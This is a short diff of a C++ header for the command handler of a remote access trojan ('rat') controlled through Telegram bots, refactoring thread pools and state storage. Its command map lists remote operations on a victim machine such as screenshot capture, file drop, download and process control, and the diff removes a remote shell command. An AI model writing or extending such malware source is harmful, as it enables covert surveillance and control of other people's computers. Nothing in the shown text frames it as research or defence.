@@ -5,7 +5,6 @@
 #include "rat/tbot/tbot.hpp"
 #include "rat/tbot/types.hpp"
 #include "rat/networking.hpp"
-
 #include <memory>
 #include <string>
 #include <array>
@@ -30,7 +29,6 @@ public:
 
 private:
     //the handler refrences the bot instead of owning it, they bot live inside the scope of the void botLoop(void) functions;
-    ThreadPool_uPtr networking_pool;
     ThreadPool_uPtr process_pool;
     ThreadPool_uPtr timer_pool;
     
@@ -38,7 +36,7 @@ private:
     std::mutex curl_client_mutex; 
     std::mutex backing_bot_mutex;
 
-    std::unique_ptr<::rat::handler::RatState> state;
+    ::rat::handler::RatState state; //this is a refrence to a stack object;
     /*since now we have a backing bot we can use its curl_client*/ 
 
     ::rat::tbot::Update telegram_update;
@@ -49,11 +47,10 @@ private:
         void (Handler::*handler)();
     };
     
-    const std::array<CommandHandler, 20> command_map = {{
+    const std::array<CommandHandler, 19> command_map = {{
         {"/reset",        &Handler::handleResetCommand},
         {"/screenshot",   &Handler::handleScreenshotCommand},
         {"/drop",         &Handler::handleDropCommand},
-        {"/sh",           &Handler::parseAndHandleShellCommand},
         {"/process",      &Handler::parseAndHandleProcessCommand},
         {"/menu",         &Handler::handleMenuCommand},
         {"/download",     &Handler::handleDownloadCommand},
@@ -108,16 +105,16 @@ private:
     
 public:
     explicit Handler() {
-        this->state = std::make_unique<::rat::handler::RatState>();
+        this->state = {}; 
         this->telegram_update = {};
         this->command = {};
     };
+    ~Handler() {};
     void setMasterId(uint64_t Master_Id);
     void initMainBot(const char* arg_Token);
     void initBackingBot(const char* arg_Token);
     void initCurlClient(uint8_t Operation_Restart_Bound = 5);
-    void initThreadPools(uint8_t Number_Networking_Threads = 1, uint8_t Number_Process_Threads = 1, uint8_t Number_Timer_Threads = 2);
-    
+    void initThreadPools(uint8_t Number_Process_Threads = 1, uint8_t Number_Timer_Threads = 2);
     // Handle Telegram update
     void handleUpdate(rat::tbot::Update&& arg_Update);
      
